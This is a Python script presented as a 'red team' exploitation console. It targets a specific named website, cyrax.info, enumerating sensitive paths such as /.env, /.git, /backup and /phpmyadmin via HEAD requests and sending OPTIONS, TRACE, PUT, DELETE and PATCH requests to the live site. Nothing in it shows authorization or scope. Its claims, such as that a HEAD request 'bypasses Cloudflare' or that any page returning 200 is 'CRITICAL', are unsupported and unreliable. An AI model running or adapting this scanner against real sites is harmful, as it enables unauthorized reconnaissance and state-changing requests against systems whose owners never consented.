#!/usr/bin/env python3
"""
MobileSec Red Team Console - HEAD Method Exploitation
Target: cyrax.info
TACTICAL ASSESSMENT: HEAD method bypasses Cloudflare - exploiting for information disclosure
PROTOCOL: Using HEAD requests to enumerate resources
"""

import requests
import sys
import time

# ANSI Colors
R = "\x1b[1;31m"
G = "\x1b[1;32m"
Y = "\x1b[1;33m"
B = "\x1b[1;34m"
C = "\x1b[1;36m"
NC = "\x1b[0m"

TARGET = "https://cyrax.info"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

def test_head_method():
    """Test HEAD method for information disclosure"""
    print(f"\n{B}[*] Testing HEAD Method for Information Disclosure{NC}\n")
    
    try:
        r = requests.head(TARGET, headers={'User-Agent': UA}, timeout=10, verify=True)
        print(f"{G}[+] HEAD request successful (Status: {r.status_code}){NC}\n")
        
        print(f"{C}[*] Response Headers from HEAD:{NC}")
        for header, value in sorted(r.headers.items()):
            print(f"  {header}: {value}")
        
        return True
    except Exception as e:
        print(f"{R}[!] Error: {e}{NC}")
        return False

def enumerate_with_head():
    """Enumerate paths using HEAD method"""
    print(f"\n{B}[*] Enumerating Paths with HEAD Method{NC}\n")
    
    paths = [
        '/', '/admin', '/login', '/api', '/api/v1', '/api/v2',
        '/robots.txt', '/sitemap.xml', '/.env', '/.git',
        '/config', '/backup', '/test', '/dev', '/staging',
        '/swagger.json', '/api-docs', '/.well-known/security.txt',
        '/index.php', '/index.html', '/wp-admin', '/phpmyadmin'
    ]
    
    found = []
    
    for path in paths:
        try:
            url = f"{TARGET.rstrip('/')}{path}"
            r = requests.head(url, headers={'User-Agent': UA}, timeout=5, verify=True)
            
            status_color = G if r.status_code == 200 else Y if r.status_code in [301, 302] else C
            print(f"{status_color}[{r.status_code}] HEAD {url}{NC}")
            
            if r.status_code == 200:
                size = r.headers.get('Content-Length', 'unknown')
                content_type = r.headers.get('Content-Type', 'unknown')
                print(f"    Content-Length: {size}")
                print(f"    Content-Type: {content_type}")
                found.append((url, r.status_code, size, content_type))
            elif r.status_code in [301, 302]:
                location = r.headers.get('Location', 'N/A')
                print(f"    -> {location}")
                found.append((url, r.status_code, location))
            
            time.sleep(0.2)
        except:
            pass
    
    return found

def test_options_method():
    """Test OPTIONS method for allowed methods"""
    print(f"\n{B}[*] Testing OPTIONS Method{NC}\n")
    
    try:
        r = requests.options(TARGET, headers={'User-Agent': UA}, timeout=10, verify=True)
        print(f"{G}[+] OPTIONS request (Status: {r.status_code}){NC}\n")
        
        allowed = r.headers.get('Allow', 'Not specified')
        print(f"{C}[*] Allowed Methods: {allowed}{NC}")
        
        if 'Allow' in r.headers:
            methods = [m.strip() for m in allowed.split(',')]
            print(f"{C}[*] Methods: {', '.join(methods)}{NC}")
        
        # Check for other interesting headers
        print(f"\n{C}[*] All OPTIONS Response Headers:{NC}")
        for header, value in sorted(r.headers.items()):
            print(f"  {header}: {value}")
        
        return True
    except Exception as e:
        print(f"{R}[!] Error: {e}{NC}")
        return False

def test_put_delete():
    """Test PUT and DELETE methods"""
    print(f"\n{B}[*] Testing PUT and DELETE Methods{NC}\n")
    
    methods = ['PUT', 'DELETE', 'PATCH']
    
    for method in methods:
        try:
            r = requests.request(method, TARGET, headers={'User-Agent': UA}, 
                                timeout=5, verify=True)
            status_color = G if r.status_code == 200 else Y if r.status_code in [201, 204] else C
            print(f"{status_color}[{r.status_code}] {method}{NC}")
            
            if r.status_code in [200, 201, 204]:
                print(f"    {method} method allowed!")
        except:
            pass
        time.sleep(0.3)

def test_trace_method():
    """Test TRACE method (if enabled, can reveal proxy info)"""
    print(f"\n{B}[*] Testing TRACE Method{NC}\n")
    
    try:
        r = requests.request('TRACE', TARGET, headers={'User-Agent': UA}, 
                           timeout=5, verify=True)
        
        if r.status_code == 200:
            print(f"{R}[!] TRACE method enabled (Security Risk!){NC}")
            print(f"{C}[*] Response:{NC}")
            print(r.text[:500])
            return True
        else:
            print(f"{C}[*] TRACE method returned: {r.status_code}{NC}")
    except:
        print(f"{C}[*] TRACE method not supported{NC}")
    
    return False

def main():
    print(f"{B}{'='*70}{NC}")
    print(f"{B}  MOBILESEC - HEAD METHOD EXPLOITATION{NC}")
    print(f"{B}  TARGET: {TARGET}{NC}")
    print(f"{B}{'='*70}{NC}")
    
    findings = []
    
    # Test HEAD method
    if test_head_method():
        findings.append("HEAD method bypasses Cloudflare")
    
    # Enumerate with HEAD
    found_paths = enumerate_with_head()
    if found_paths:
        findings.append(f"Found {len(found_paths)} accessible paths via HEAD")
        for url, status, *info in found_paths:
            if status == 200:
                findings.append(f"CRITICAL: {url} accessible via HEAD")
    
    # Test OPTIONS
    if test_options_method():
        findings.append("OPTIONS method provides method enumeration")
    
    # Test PUT/DELETE
    test_put_delete()
    
    # Test TRACE
    if test_trace_method():
        findings.append("CRITICAL: TRACE method enabled (information disclosure)")
    
    # Summary
    print(f"\n{B}{'='*70}{NC}")
    print(f"{B}[*] EXPLOITATION SUMMARY{NC}")
    print(f"{B}{'='*70}{NC}\n")
    
    if findings:
        print(f"{Y}[!] Findings:{NC}\n")
        for i, finding in enumerate(findings, 1):
            print(f"  {i}. {finding}")
    else:
        print(f"{C}[*] Limited information gathered via HEAD method{NC}")
    
    print(f"\n{B}[*] Testing completed{NC}")

if __name__ == "__main__":
    main()
